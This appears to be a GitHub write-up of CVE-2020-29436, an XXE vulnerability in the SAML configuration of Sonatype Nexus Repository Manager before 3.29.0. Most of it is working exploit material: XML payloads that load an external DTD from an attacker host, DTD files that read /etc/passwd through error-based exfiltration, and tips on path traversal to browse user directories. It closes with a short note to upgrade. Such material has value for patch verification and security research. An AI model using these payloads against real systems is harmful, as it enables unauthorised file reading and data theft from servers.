# CVE-2020-29436
## Sonatype Nexus Repository Manager 3.x before 3.29.0 allows a user with admin privileges to configure the system to gain access to content outside of NXRM via an XXE vulnerability. Fixed in version 3.29.0.

An XML External Entities (XXE) injection vulnerability has been discovered in Nexus Repository Manager requiring immediate action. The vulnerability allows an attacker with an administrative account in NXRM to configure the system in a way that allows them to view files on the filesystem, and to interact with any back-end or external systems that NXRM can access. Sonatype have mitigated the issue by no longer allowing the XML parsing library to process these external entities.

Blind XXE OoB extra ERROR -- Java

Payload in SAML field:
https://example.com/nexus/#admin/security/saml

![image](https://user-images.githubusercontent.com/80063008/136324915-29447fa7-d291-48d6-aa07-c2c642c67de4.png)

```xml
<?xml version="1.0" ?>
<!DOCTYPE message [
    <!ENTITY % ext SYSTEM "http://attackerIP/ext.dtd">
    %ext;
]>
<message></message>"
```

Contents of ext.dtd on the attacker machine

![image](https://user-images.githubusercontent.com/80063008/136325051-421fbb9f-6b67-4633-a5b5-f931ee7fbcbd.png)

SAML request intercepted in Burpsuite:

![image](https://user-images.githubusercontent.com/80063008/136325224-c9bc3bca-e659-42d5-a2a5-c4247401ec2b.png)

And the response showing that the XXE payload was successful and we read the /etc/hostname file

![image](https://user-images.githubusercontent.com/80063008/136325388-7fc1e33e-6178-43bc-9850-b9f1bbbc5222.png)

We can change the file path to anything for path traversal.  For example, we change the /etc/hostname to /home/ and can see all the folders of the users. We can copy as curl command from Burp and pipe it to sed to get new lines. 

```bash
sed 's/\\n/\'$'\n''/g' 
```

Other XXE payloads that worked for me. Some trial and error may be needed depending on the target firewalls and filters.

Payload in Burp:

```xml
<?xml version=\"1.0\"?>\n<!DOCTYPE r [\n<!ENTITY % sp SYSTEM \"http://attackerIP/ext.dtd\">\n%sp;\n%param3;\n%exfil;\n]>\n<r></r> 
```

ext.dtd file hosted on attacker machine.

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd/"> 
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///doesntexist/%file;'>"> 
%eval; 
%error; 
```

XML payload:

```xml
<?xml version="1.0"?>
<!DOCTYPE r [
<!ENTITY % payload SYSTEM "file:///etc/passwd">
<!ENTITY % sp SYSTEM "http://attackerIP/ext.dtd">
%sp;
%param3;
%exfil;
]>
<r></r>
```

ext.dtd file contents

```xml
<!ENTITY % param1 '<!ENTITY &#x25; external SYSTEM "file:///nothere/%payload;">'> %param1; %external;
```


### Recommended Solution:

Update Nexus to at least version 3.29.0
